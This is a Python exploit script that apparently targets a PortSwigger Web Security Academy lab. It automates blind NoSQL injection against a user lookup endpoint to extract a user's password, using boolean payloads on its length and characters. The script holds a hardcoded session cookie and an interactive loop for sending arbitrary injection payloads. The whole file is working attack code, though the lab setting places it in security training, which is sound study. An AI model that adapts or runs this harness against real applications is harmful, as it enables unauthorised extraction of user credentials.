import requests
import urllib.parse

# Configuration
BASE_URL = 'https://0a2d00a8034381b580de17d7000f0055.web-security-academy.net'
SESSION_COOKIE = 'IvmiSy3d9y7NzBfmBRnhgPUIsPOeqeSC'

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_request(injection_payload):
    """Send request with the injection payload and return full response details"""
    
    # Build the full injection string
    full_injection = f"wiener' && {injection_payload} || 'a'=='b"
    
    # URL encode it
    encoded = urllib.parse.quote(full_injection, safe='')
    
    # Build full URL
    url = f'{BASE_URL}/user/lookup?user={encoded}'
    
    # Headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Ch-Ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': f'{BASE_URL}/my-account?id=wiener',
        'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=1, i'
    }
    
    # Cookies
    cookies = {
        'session': SESSION_COOKIE
    }
    
    # Make request
    response = requests.get(url, headers=headers, cookies=cookies, verify=False)
    
    # Print everything
    print("\n" + "="*60)
    print(f"PAYLOAD: {injection_payload}")
    print(f"FULL INJECTION: {full_injection}")
    print(f"URL: {url}")
    print("-"*60)
    print(f"STATUS CODE: {response.status_code}")
    print(f"RESPONSE LENGTH: {len(response.text)} bytes")
    print(f"RESPONSE HEADERS: {dict(response.headers)}")
    print("-"*60)
    print("RESPONSE BODY:")
    print(response.text[:1000])  # First 1000 chars
    if len(response.text) > 1000:
        print(f"... (truncated, total {len(response.text)} bytes)")
    print("="*60)
    
    return response

# Test various payloads
print("Testing NoSQL Injection Payloads")
print("="*60)

# Test 1: Check if injection works at all
print("\n[TEST 1] Basic true condition:")
send_request("1==1")

print("\n[TEST 2] Basic false condition:")
send_request("1==2")

print("\n[TEST 3] Check username field:")
send_request("this.username == 'wiener'")

print("\n[TEST 4] Check if password field exists:")
send_request("this.password")

print("\n[TEST 5] Check password length:")
send_request("this.password.length > 0")

print("\n[TEST 6] Check password length == 20:")
send_request("this.password.length == 20")

print("\n[TEST 7] Check first character of password:")
send_request("this.password[0] == 'a'")

print("\n[TEST 8] Check first character >= 'p':")
send_request("this.password[0] >= 'p'")

print("\n[TEST 9] Check first character <= 'p':")
send_request("this.password[0] <= 'p'")

print("\n[TEST 10] Using substring:")
send_request("this.password.substring(0,1) == 'a'")

print("\n[TEST 11] Using regex:")
send_request("this.password.match(/^a/)")

print("\n[TEST 12] Check a different field that might exist:")
send_request("this._id")

# Interactive mode
print("\n" + "="*60)
print("INTERACTIVE MODE - Enter your own payloads (type 'quit' to exit)")
print("Example: this.password[0] == 'p'")
print("="*60)

while True:
    payload = input("\nEnter injection payload (or 'quit'): ").strip()
    if payload.lower() == 'quit':
        break
    if payload:
        send_request(payload)